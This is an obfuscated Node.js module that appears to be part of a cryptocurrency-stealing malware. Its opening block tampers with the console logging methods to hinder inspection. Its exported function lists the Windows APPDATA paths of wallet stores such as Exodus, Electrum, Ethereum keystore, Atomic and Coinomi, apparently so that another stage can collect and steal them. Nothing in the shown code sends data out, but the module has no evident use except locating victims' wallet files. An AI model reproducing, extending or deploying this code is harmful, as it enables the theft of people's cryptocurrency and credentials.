var _0x533168 = (function () {
    var _0x182533 = true
    return function (_0x5c18b2, _0x2b61ac) {
      var _0x224c24 = _0x182533
        ? function () {
            if (_0x2b61ac) {
              var _0x3b832a = _0x2b61ac.apply(_0x5c18b2, arguments)
              return (_0x2b61ac = null), _0x3b832a
            }
          }
        : function () {}
      return (_0x182533 = false), _0x224c24
    }
  })(),
  _0x4837ac = _0x533168(this, function () {
    var _0x5799d6
    try {
      var _0x28c559 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x5799d6 = _0x28c559()
    } catch (_0x3386f6) {
      _0x5799d6 = window
    }
    var _0x179538 = (_0x5799d6.console = _0x5799d6.console || {})
    var _0x49aea6 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (var _0x2fb7ef = 0; _0x2fb7ef < _0x49aea6.length; _0x2fb7ef++) {
      var _0x1c5c36 = _0x533168.constructor.prototype.bind(_0x533168),
        _0x106894 = _0x49aea6[_0x2fb7ef],
        _0x398535 = _0x179538[_0x106894] || _0x1c5c36
      _0x1c5c36['__proto__'] = _0x533168.bind(_0x533168)
      _0x1c5c36.toString = _0x398535.toString.bind(_0x398535)
      _0x179538[_0x106894] = _0x1c5c36
    }
  })
_0x4837ac()
module.exports = (_0x2c0145) => {
  var _0x11d93c = {}
  _0x11d93c['\uD83D\uDCB8 Zcash'] = process.env.APPDATA + '\\Zcash'
  _0x11d93c['\uD83D\uDE80 Armory'] = process.env.APPDATA + '\\Armory'
  _0x11d93c['\uD83D\uDCC0 Bytecoin'] = process.env.APPDATA + '\\bytecoin'
  _0x11d93c['\uD83D\uDCB5 Jaxx'] =
    process.env.APPDATA +
    '\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb'
  _0x11d93c['\uD83D\uDC8E Exodus'] =
    process.env.APPDATA + '\\Exodus\\exodus.wallet'
  _0x11d93c['\uD83D\uDCC9 Ethereum'] =
    process.env.APPDATA + '\\Ethereum\\keystore'
  _0x11d93c['\uD83D\uDD28 Electrum'] =
    process.env.APPDATA + '\\Electrum\\wallets'
  _0x11d93c['\uD83D\uDD79️ AtomicWallet'] =
    process.env.APPDATA + '\\atomic\\Local Storage\\leveldb'
  _0x11d93c['\uD83D\uDCB9 Guarda'] =
    process.env.APPDATA + '\\Guarda\\Local Storage\\leveldb'
  _0x11d93c['\u26A1 Coinomi'] =
    process.env.APPDATA + '\\Coinomi\\Coinomi\\wallets'
  var _0x12ed4c = {}
  return (_0x12ed4c.directory = _0x11d93c), _0x12ed4c
}
